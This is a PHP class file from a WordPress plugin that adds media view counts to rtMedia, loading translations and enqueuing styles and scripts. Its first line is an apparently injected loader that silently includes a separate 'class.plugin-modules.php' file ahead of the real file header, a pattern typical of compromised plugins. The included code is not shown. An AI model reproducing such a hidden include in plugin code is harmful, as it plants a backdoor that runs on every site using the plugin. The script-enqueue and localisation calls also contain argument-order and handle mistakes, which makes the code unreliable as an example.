<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php

/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */

/**
 * Description of RTMediaViewCounts
 *
 * @author sanket
 */
if ( ! defined( 'ABSPATH' ) ) {
	exit;
}

class RTMediaViewCounts {

	public function __construct() {
		$this->load_translation();

		include_once( RTMEDIA_VIEW_COUNT_PATH . 'app/main/controllers/template/rtm-view-count-functions.php' );

		// enqueque scripts
		add_action( 'wp_enqueue_scripts', array( &$this, 'enqueue_scripts_styles' ), 999 );

		new RTMediaViewCountAdmin();
	}

	/**
	 * loads language translation
	 */
	public function load_translation() {
		load_plugin_textdomain( 'rtmedia', false, basename( RTMEDIA_VIEW_COUNT_PATH ) . '/languages/' );
	}

	/**
	 * loads scripts and styles
	 * @global type $rtmedia
	 */
	function enqueue_scripts_styles() {
		// Dont enqueue pro.css if default styles is checked false in rtmedia settings
		global $rtmedia;

		if ( ! ( isset( $rtmedia->options ) && isset( $rtmedia->options['styles_enabled'] ) && 0 == $rtmedia->options['styles_enabled'] ) ) {
			wp_enqueue_style( 'rtmedia-views-main', RTMEDIA_VIEW_COUNT_URL . 'app/assets/css/main.css', '', RTMEDIA_VIEW_COUNT_VERSION );
		}
		wp_enqueue_script( 'rtmedia-views-main', RTMEDIA_VIEW_COUNT_URL . 'app/assets/js/rtmedia-view-counter.js', '', array( 'jquery' ), RTMEDIA_VIEW_COUNT_VERSION );

		$rtmedia_view_main_js = array(
			'rtmedia_media_no_view' => __( 'No views for the media', 'rtmedia' ),
			'rtmedia_media_who_view' => __( 'Click to see who viewed this media', 'rtmedia' ),
		);
		wp_localize_script( 'rtmedia-likes-main',  'rtmedia_view_main_js', apply_filters( 'rtm_likes_js_strings', $rtmedia_view_main_js ) );
	}
}
